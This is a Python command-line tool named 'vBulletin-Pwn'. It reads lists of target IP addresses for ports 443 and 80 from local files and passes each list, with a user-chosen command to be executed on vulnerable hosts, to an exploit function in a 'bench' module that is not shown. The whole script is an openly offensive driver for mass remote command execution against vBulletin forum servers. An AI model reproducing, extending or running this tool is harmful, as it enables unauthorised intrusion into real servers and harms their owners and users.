#!/usr/bin/env python3
import click
import pyfiglet
from termcolor import colored
import sys

def ascii_banner():
    banner = pyfiglet.figlet_format("vBulletin-Pwn")
    return banner

print(colored(ascii_banner(), 'magenta', attrs=['bold']))

@click.command()
@click.option('-o', help='Output file', type=click.Path())
@click.option('-c', help='Command to be executed on vulnerable hosts')
def scan(o, c):
	file_names = ['vbullet-443', 'vbullet-80']
	from IPy import IP 
	for i in file_names: 
		try:
			with open(i, 'r') as file_name:
				currline = 0
				try:
					for line in file_name:
						IP(line.strip('\n'))
						currline += 1
				except ValueError:
					print(colored('Invalid IP address %s on line %s in %s...' % (line.strip('\n'), str(currline + 1), i), 'red', attrs=['bold']))
					answer = input(colored('Would you like to remove it? Y/N: '))
					if answer.lower() == "y":
						file_name.seek(0)
						lines = file_name.readlines()	
						with open(i, 'w') as file2edit:
							for pos, line in enumerate(lines):
								if pos != currline:
									file2edit.write(line)
							print(colored('Line removed, please re-run vbulletin-scan.py!', 'green', attrs=['bold']))	
		except FileNotFoundError:
			print(colored('%s is missing from your current directory!' % i, 'red', attrs=['bold']))
	import bench
	for i in file_names:
		if i == 'vbullet-443':
			print(colored("--------------------------", 'red'))
			print(colored("Exploiting *:443 Hosts", 'green', attrs=['bold']))
			print(colored("--------------------------", 'red'))
			bench.exploit(i, o, c)
		else:
			print(colored("--------------------------", 'red'))
			print(colored("Exploiting *:80 Hosts", 'green', attrs=['bold']))
			print(colored("--------------------------", 'red'))
			bench.exploit(i, o, c)
scan()
